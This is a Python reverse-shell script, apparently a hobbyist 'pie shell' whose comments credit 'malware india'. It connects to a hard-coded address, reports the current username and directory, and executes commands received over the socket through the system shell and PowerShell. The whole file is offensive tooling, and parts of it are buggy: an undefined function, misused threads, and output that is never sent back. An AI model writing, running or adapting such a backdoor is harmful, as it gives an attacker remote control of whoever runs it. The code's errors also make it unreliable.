#!/usr/bin/env python3
encoding = 'utf-8'
import socket
import subprocess
import os
import threading
import getpass

def d(cmd):#function decelatration
    try:


        while True:#infinite loop
    #this line gets command from the user
            if cmd == 'qqq':
                soc()
    #if user inputs exit the program will be ended
            elif cmd == 'powershell':
                subprocess.call(["C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe"])
    #this used to intiate powershell wich is bult in windows
            elif cmd == 'help':
                print('''hello this is help this pie shell is made by abdul faheem cmd from malware india
                start= to start an application
                eg start chrome
                others all commands are based on the os thank u''')
    #this is cmd simple help with my name and in bult help is also displayed
    #i have used try method to avoid errors
            elif cmd[:5]=='start':
                print('starting'+cmd[5:])
                t2=threading.Thread(subprocess.run(cmd,shell=True))
    #if cmd users starts cmd outside program this will start that new program in cmd new thread so that
    #the shell does not get stuck
    #this is the in bult function which runs the shell commands
    #i havetested this in multible os it does work in unix also and windows too
            elif cmd[:3] == 'cd ':
                if cmd[3:] == '..':
                    cmd, b = os.path.split(os.getcwd())
                    del b
                    os.chdir(cmd)
                    continue
                else:
                    os.chdir(cmd[3:])
                    continue
    #some times cd is not able to access out side the given scope because the sub prosss module does not
    #have cmd in bult file path so os command is used here
                # if b.returncode == 1:
                #     print("invalid command")
                #     continue
    #the above commands are my trial and error commands which is commented out
            else:
                b = subprocess.run(cmd, capture_output=True, shell=True, text=True)

            print(b.stdout)#this print output
            print(b.stderr)#this error
            pysh()
    except:
        if cmd[:6]=='start ':
            print("checking the program status")
            print('b.stderr')
            pysh() #in starting an application we get some prosses error because the tread is over loaded
            #so i have this pice of code here
        else:
            print("## check the input ##")
            pysh()




def pysh():
        
    dirname=os.getcwd()
    s.sendall(bytes(dirname, 'ascii'))
    data = s.recv(4024)
    cmd=data.decode(encoding)
    print (cmd)
    #if any internal error occur then this will end up
    t1=threading.Thread(d(cmd))#this command intiate the progra

HOST = '10.0.2.5'
PORT = 65432 
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    ack= bytes('Connected by'+ HOST+' as user : '+ getpass.getuser(), 'ascii')
    s.sendall(ack)
    pysh()

soc()